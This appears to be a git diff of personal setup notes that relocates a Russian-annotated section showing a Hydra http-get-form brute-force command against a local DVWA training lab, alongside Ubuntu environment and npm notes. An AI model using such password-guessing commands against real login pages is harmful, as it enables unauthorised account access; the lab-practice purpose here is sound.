@@ -1,11 +1,3 @@
-# Hydra 9.4 http-get-form broot force
-- (:) - Это разделитель между заголовками запроса
-- (\:) - Это экранирование символа, чтобы передать в заголовке запроса
-- Все что внутри `^USER^` будет подставляться переданным или значением из словаря
-```bash
-hydra -l admin -p password -V 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login\:Username and/or password incorrect.:H=Cookie\:PHPSESSID=ud8cn4dlf3o7b2entm60t49tb5; security=low;"
-```
-if you're OK you will see
 
 
 
@@ -14,6 +6,18 @@ if you're OK you will see
 `Ubuntu 22.04.01 LTS amd64`
 - add permanent env variables into
 `etc/environment`
+
+### Hydra 9.4 http-get-form broot force
+- `:` - Это разделитель между заголовками запроса
+- `\:` - Это экранирование символа, чтобы передать в заголовке запроса
+- Все что внутри `^USER^` будет подставляться переданным или значением из словаря
+```bash
+hydra -l admin -p password -V 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login\:Username and/or password incorrect.:H=Cookie\:PHPSESSID=ud8cn4dlf3o7b2entm60t49tb5; security=low;"
+```
+if you're OK you will see
+
+<img width="1326" alt="image" src="https://user-images.githubusercontent.com/89765480/203627350-9f00e3db-7cdd-4048-bb46-b5926bc13718.png">
+
 ###
 ``` Install npm 
 # update packages and install npm
